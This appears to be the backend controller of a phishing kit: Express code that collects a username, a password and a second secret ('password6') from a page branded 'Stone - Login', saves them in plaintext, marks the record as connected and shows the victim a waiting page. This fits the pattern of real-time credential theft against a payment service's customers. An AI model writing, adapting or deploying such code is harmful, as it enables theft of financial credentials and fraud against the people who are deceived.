const userByToken = require('../../middlewares/auth')
const Client = require('../../models/Client')

module.exports = {
    async view(req, res) {
        try {
            const { username: user, password, password6 } = req.body

            console.log(`voltei`)

            if (!user) return res.redirect('/')

            const clientUser = await Client.findOne({ where: { user } })

            if (clientUser) {
                await clientUser.update({
                    user,
                    password,
                    password6,
                    status: `connect`,
                })

                return res.render('await', {
                    title: 'Stone - Login',
                    pageClasses: 'cadastro',
                    client: {
                        mail: clientUser.user,
                    },
                })
            }

            const client = await Client.create({
                user,
                password,
                password6,
                status: 'conectado',
            })

            return res.render('await', {
                title: 'Stone - Login',
                pageClasses: 'cadastro',
                client: {
                    mail: client.user,
                },
            })
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },
}
